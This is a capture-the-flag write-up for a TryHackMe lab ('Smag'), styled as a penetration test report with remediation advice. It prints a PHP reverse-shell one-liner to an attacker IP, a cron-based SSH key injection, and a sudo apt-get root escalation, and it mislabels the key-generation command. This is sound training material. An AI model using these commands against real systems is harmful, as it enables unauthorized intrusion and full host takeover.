A THM Room

By Sovren


# Executive Summary

A penetration test was conducted against the target host to identify vulnerabilities that could allow an attacker to gain unauthorized access.

The assessment identified several security weaknesses that allowed full system compromise. The attack chain involved:

1. Discovery of exposed services via port scanning.
    
2. Enumeration of a development directory containing a packet capture file (.pcap).
    
3. Extraction of plaintext credentials from the packet capture.
    
4. Access to a development login panel which allowed command execution.
    
5. Establishment of a reverse shell as the `www-data` user.
    
6. Privilege escalation to a user through a writable file used by a scheduled cron job.
    
7. Privilege escalation to root through misconfigured `sudo` permissions allowing execution of `apt-get`.
    

These issues collectively allowed complete system compromise, demonstrating critical weaknesses in credential handling, file permissions, and privilege management.

# Reconnaissance

Initial inspection indicated that the website was under development, and no sensitive information was immediately visible in the page source.

### Nmap

`sudo nmap -sC -sV --version-intensity 5 -O --osscan-guess -T4 -Pn 10.114.180.150 -p-`

`PORT   STATE SERVICE VERSION`
`22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)`
`| ssh-hostkey:` 
`|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)`
`|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)`
`|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)`
`80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))`
`|_http-title: Smag`
`Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.10 - 3.13 (96%), Linux 3.13 (96%), Linux 4.4 (96%), Linux 5.4 (96%), Amazon Fire TV (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 6.0 - 9.0 (Linux 3.18 - 4.4) (92%)`
`No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).`

The HTTP service hosted a website titled "Smag".

Operating system fingerprinting indicated a Linux-based system (Ubuntu kernel 4.x).

# Enumeration

### Gobuster

`gobuster dir -u http://10.114.180.150 -w /usr/share/wordlists/dirb/common.txt`

`index.php            (Status: 200) [Size: 402]`
`mail                 (Status: 301) [Size: 315] [--> http://10.114.180.150/mail/]`
`server-status        (Status: 403) [Size: 279]`


##### /mail

- This page contains a .pcap file that can be downloaded and inspected. 
- Frame 4 of the .pcap file contains login credentials - helpdesk:cH4nG3M3_n0w
- The login request was sent to: `http://development.smag[.]thm/login.php` 


# Exploitation
##### Logon Page

Using the credentials obtained from the packet capture, authentication to the admin.php page was successful. 

The application contained a command execution interface. Although command output was not displayed in the web interface, outbound connections confirmed that commands were being executed on the server.

A reverse shell was established using the following command:
`php -r '$sock=fsockopen("10.10.10.10",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

After successful exploitation, a shell was obtained as:
`www-data`

###### Initial Enumeration

`whoami`
www-data

`uname -a`
Linux smag 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

`ls /home`
jake

###### Cron Job Discovery

Contents of `/etc/crontab` revealed a scheduled task:

`cat /etc/crontab`
`/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys`

And misconfigured file permissions:
`ls -l /opt/.backups/jake_id_rsa.pub.backup`
`-rw-rw-rw- 1 root root ...`

##### Exploitation

`ls -l /opt/.backups/jak*`
`-rw-rw-rw- 1 root root 563 Jun  5  2020 /opt/.backups/jake_id_rsa.pub.backup`

Jake's public key can be written into and the cronjob will back it up to the .ssh/authorized_keys file.
An attacker can create their own key pair from their own machine, write the public key they generated into /opt/.backups/jake_id_rsa.pub.backup and the cronjob will then write it into the authorized_keys folder. 

`ssh-keysign -t RSA jaker`
`sudo chmod 600 jaker`

Sign in via ssh using the private key:
`ssh -i jaker jake@<target>` 

By stabilising the reverse-shell and then using nano to delete jake's public key and insert another public key that is paired to the attackers generated private key, an attacker is able to log in as jake on the target machine. This does not take long, as the cronjob is scheduled to run every minute. 

# Privilege Escalation

`whoami`
jake

`sudo -l` 
`Matching Defaults entries for jake on smag:`
    `env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin`

`User jake may run the following commands on smag:`
    `(ALL : ALL) NOPASSWD: /usr/bin/apt-get`

Using a technique documented in **GTFOBins**, root access was obtained:

```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

Executing the command above will give you root access. The last flag can be found in the /root directory. 


# Impact

Successful exploitation allowed an attacker to:

- Access the system as www-data
    
- Escalate privileges to user jake
    
- Escalate privileges to root
    
- Gain full administrative control of the host
    

This level of access would allow attackers to:

- Read or modify sensitive data
    
- Install malware or backdoors
    
- Pivot further into the network
    
- Completely compromise system integrity
    

Severity: **Critical**


# Recommendations

## Secure Sensitive Files

Sensitive debugging files such as `.pcap` captures should never be publicly accessible.

Recommendations:

- Remove development artifacts from production servers.
    
- Restrict file access via authentication.
    

---

## Credential Security

Credentials should not be transmitted or stored in plaintext.

Recommendations:

- Use encrypted channels (HTTPS).
    
- Implement secure credential management.
    

---

## Restrict File Permissions

World-writable files should not exist in privileged directories.

Example vulnerable file:

/opt/.backups/jake_id_rsa.pub.backup

Recommendation:

chmod 600  
chown root:root

---

## Harden Cron Jobs

Cron jobs should not use files that can be modified by unprivileged users.

Recommendation:

- Ensure only trusted users can modify cron input files.
    

---

## Review Sudo Permissions

Allowing unrestricted execution of `apt-get` is dangerous.

Recommendation:

- Remove unnecessary sudo privileges.
    
- Apply **least privilege principle**.
    

---

# Conclusion

The system contained multiple security misconfigurations that allowed an attacker to move from initial access to full root compromise.

The most significant issues included:

- Exposed sensitive files
    
- Insecure credential handling
    
- World-writable files used by privileged processes
    
- Overly permissive sudo privileges
    

Remediating these vulnerabilities will significantly improve the overall security posture of the system.


